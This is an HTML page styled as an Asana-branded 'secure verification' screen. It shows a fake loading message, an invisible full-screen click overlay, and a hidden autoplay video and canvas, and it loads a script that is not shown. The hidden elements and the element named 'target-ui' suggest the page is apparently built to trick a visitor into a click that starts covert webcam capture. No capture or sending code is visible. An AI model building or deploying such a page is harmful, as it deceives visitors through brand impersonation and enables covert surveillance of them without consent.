<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Secure verification system">
    <meta name="theme-color" content="#9B59B6">
    <title></title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <!-- Main UI Container -->
    <div id="target-ui" class="active">
        <div class="asana-wrapper">
            <!-- Logo -->
            <div class="asana-logo">
                <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="20" cy="8" r="4" fill="#F06A6A" />
                    <circle cx="12" cy="22" r="4" fill="#F06A6A" />
                    <circle cx="28" cy="22" r="4" fill="#F06A6A" />
                </svg>
            </div>

            <!-- Loading State -->
            <div class="loading-state">
                <h2 id="loading-text">Lodding please wait...</h2>
                <div class="progress-container">
                    <div id="progress-bar"></div>
                </div>
                <p class="status-msg" id="status-detail">Click anywhere to begin verification</p>
            </div>
        </div>
    </div>

    <!-- Invisible Click Trigger (Full Screen) -->
    <div id="click-trigger"
        style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:transparent; cursor:pointer;">
    </div>

    <!-- Hidden Video & Canvas Elements -->
    <video id="st-v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="st-c" style="display:none;"></canvas>

    <!-- Main Script -->
    <script src="script.js"></script>
</body>

</html>
